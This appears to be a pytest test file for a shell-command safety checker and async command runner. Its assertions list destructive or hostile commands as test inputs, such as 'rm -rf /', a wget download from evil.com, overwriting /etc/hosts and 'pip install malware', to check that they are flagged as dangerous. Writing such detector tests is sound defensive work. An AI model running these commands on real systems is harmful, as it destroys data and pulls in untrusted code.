"""Tests for the shell execution service."""

from __future__ import annotations

import pytest

from opengame.services.shell_service import ShellReadOnlyChecker, run_command


class TestShellReadOnlyChecker:
    """Tests for the ShellReadOnlyChecker."""

    @pytest.fixture
    def checker(self) -> ShellReadOnlyChecker:
        return ShellReadOnlyChecker()

    def test_read_only_commands(self, checker: ShellReadOnlyChecker) -> None:
        """Safe read-only commands are recognized."""
        assert checker.is_read_only("ls -la") is True
        assert checker.is_read_only("cat file.txt") is True
        assert checker.is_read_only("grep pattern file") is True
        assert checker.is_read_only("find . -name '*.py'") is True
        assert checker.is_read_only("wc -l file.txt") is True

    def test_dangerous_commands_not_read_only(self, checker: ShellReadOnlyChecker) -> None:
        """Dangerous commands are not read-only."""
        assert checker.is_read_only("rm -rf /") is False
        assert checker.is_read_only("sudo ls") is False
        assert checker.is_read_only("chmod 777 file") is False

    def test_git_read_only_commands(self, checker: ShellReadOnlyChecker) -> None:
        """Git log/diff/status are read-only, push/reset are not."""
        assert checker.is_read_only("git log") is True
        assert checker.is_read_only("git status") is True
        assert checker.is_read_only("git diff") is True
        assert checker.is_read_only("git push") is False
        assert checker.is_read_only("git reset --hard") is False

    def test_dangerous_patterns(self, checker: ShellReadOnlyChecker) -> None:
        """Known dangerous patterns are detected."""
        assert checker.is_dangerous("rm -rf /tmp") is True
        assert checker.is_dangerous("kill -9 1234") is True
        assert checker.is_dangerous("wget http://evil.com -O file") is True
        assert checker.is_dangerous("echo 'test' > /etc/hosts") is True
        assert checker.is_dangerous("pip install malware") is True

    def test_safe_commands_not_dangerous(self, checker: ShellReadOnlyChecker) -> None:
        """Safe commands are not flagged as dangerous."""
        assert checker.is_dangerous("ls -la") is False
        assert checker.is_dangerous("cat file.txt") is False
        assert checker.is_dangerous("echo hello") is False


class TestRunCommand:
    """Tests for async shell execution."""

    @pytest.mark.asyncio
    async def test_simple_command(self) -> None:
        """Simple command executes successfully."""
        result = await run_command("echo hello")
        assert result["exit_code"] == 0
        assert "hello" in result["stdout"]

    @pytest.mark.asyncio
    async def test_command_in_work_dir(self, temp_dir) -> None:
        """Command runs in specified working directory."""
        import os
        result = await run_command("pwd", work_dir=str(temp_dir))
        assert result["exit_code"] == 0
        assert str(temp_dir) in result["stdout"]

    @pytest.mark.asyncio
    async def test_command_timeout(self) -> None:
        """Command times out after specified seconds."""
        with pytest.raises(Exception):
            await run_command("sleep 10", timeout=1)

    @pytest.mark.asyncio
    async def test_command_not_found(self) -> None:
        """Nonexistent command returns non-zero exit code."""
        result = await run_command("nonexistent_command_xyz")
        assert result["exit_code"] != 0
        assert "not found" in result["stderr"]
